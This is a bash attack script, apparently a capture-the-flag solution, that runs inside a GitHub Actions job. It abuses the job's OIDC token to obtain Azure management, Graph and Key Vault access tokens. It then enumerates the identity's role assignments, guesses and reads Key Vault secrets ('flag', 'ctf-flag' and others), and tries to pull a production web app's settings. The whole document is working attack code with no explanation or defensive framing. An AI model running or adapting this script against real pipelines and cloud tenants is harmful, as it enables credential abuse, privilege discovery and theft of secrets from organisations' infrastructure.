#!/usr/bin/env bash
set +e
ID=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
exch(){ curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d grant_type=client_credentials -d client_id=$AZURE_CLIENT_ID --data-urlencode "scope=$1" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$ID"; }
AT=$(exch "https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
S=$AZURE_SUBSCRIPTION_ID; RG=rg-tbl-platform-prod-sea
# whoami: resolve my SP oid via graph
GT=$(exch "https://graph.microsoft.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
OID=$(curl -s -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals(appId='$AZURE_CLIENT_ID')?\$select=id,displayName" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("id",""),d.get("displayName",""))')
echo "MY SP (oid displayName): $OID"
MYOID=$(echo "$OID" | awk '{print $1}')
echo "=== my role assignments (sub scope) ==="
curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$S/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$MYOID'" | python3 -c '
import sys,json
RM={"ba92f5b4-2d11-453d-a403-e96b0029c9fe":"BlobDataContributor","2a2b9908-6ea1-4ae2-8e65-a410df84e7d1":"BlobDataReader","17d1049b-9a84-46fb-8f53-869881c3d3ab":"StorageAcctContributor","4633458b-17de-408a-b874-0445c86b69e6":"KV-Secrets-User","b86a8fe4-44ce-4948-aee5-eccb2c155cd7":"KV-Secrets-Officer","8e3af657-a8ff-443c-a75c-2fe8c4bcb635":"Owner","acdd72a7-3385-48ef-bd42-f606fba81ae7":"Reader","de139f84-1756-47ae-9be6-808fbbe84772":"WebsiteContributor"}
for r in json.load(sys.stdin).get("value",[]):
  p=r["properties"];rd=p.get("roleDefinitionId","").split("/")[-1]
  print("  ",RM.get(rd,rd),"@",p.get("scope"))
'
echo "=== kv-tbl-sec: list + GET guesses ==="
KT=$(exch "https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
curl -s -H "Authorization: Bearer $KT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 300; echo
for n in flag FLAG the-flag storefront-flag ctf-flag df26 tebamoto-flag flag-prod prod-flag challenge; do
  v=$(curl -s -H "Authorization: Bearer $KT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$n?api-version=7.4")
  echo "$v" | grep -q '"value"' && echo "  SEC[$n]=$(echo "$v"|python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')"
done
echo "=== appsettings (Website Contributor?) ==="
curl -s -X POST -H "Authorization: Bearer $AT" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$S/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01" | head -c 600; echo
echo "DONE"
